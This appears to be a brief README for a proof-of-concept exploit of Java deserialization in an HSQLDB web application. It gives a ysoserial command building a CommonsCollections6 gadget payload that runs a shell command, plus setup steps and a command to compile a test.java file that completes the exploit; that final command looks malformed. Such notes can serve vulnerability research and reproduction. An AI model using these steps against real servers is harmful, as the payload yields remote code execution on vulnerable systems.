# Use ysoserial create payload 

```
java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections6 "touch /tmp/123123" > /tmp/calc.ser
```

# Add tomcat to hsqldb-source-master

use intellij idea to add tomcat for the project


# Compile test.java to complete expoloit

Attention:
1. add commons-codec.jar to the project
2. add hsqldb.jar to the project

java -jar hsqldb.jar:commons-codec.jar test.java
